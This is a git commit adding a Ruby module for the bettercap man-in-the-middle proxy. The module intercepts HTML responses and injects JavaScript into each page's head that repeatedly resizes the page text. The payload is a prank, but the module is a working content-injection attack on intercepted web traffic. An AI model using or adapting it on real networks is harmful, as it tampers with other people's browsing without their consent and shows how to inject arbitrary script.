6403e2c5106206365d09d01106649de87ab1fc73
Robbie <txt3rob@gmail.com>
2015-07-28 09:07:54 +0100

    2 New Modules
    Resize Text & Shake Screen

---
+++ resizetext.rb
@@ -0,0 +1,38 @@
+=begin
+
+BETTERCAP
+
+Author : Simone 'evilsocket' Margaritelli
+Email  : evilsocket@gmail.com
+Blog   : http://www.evilsocket.net/
+
+This project is released under the GPL 3 license.
+
+=end
+class HackTitle < Proxy::Module
+  def on_request( request, response )
+    # is it a html page?
+    if response.content_type =~ /^text\/html.*/
+      Logger.info "Hacking http://#{request.host}#{request.url} title tag"
+      # make sure to use sub! or gsub! to update the instance
+      response.body.sub!( '<head>', '<head> <script type="text/javascript">
+window.onload = function() {
+	var size = 1.0
+	var up = true;
+	
+	setInterval(function() {
+		document.body.style.fontSize = size + "em";
+		if (up)
+			size += 1;
+		else
+			size -= 1;
+		if (size == 10)
+			up = false;
+		if (size == 0)
+			up = true;
+    }, 100);
+}
+</script>' )
+    end
+  end
+end
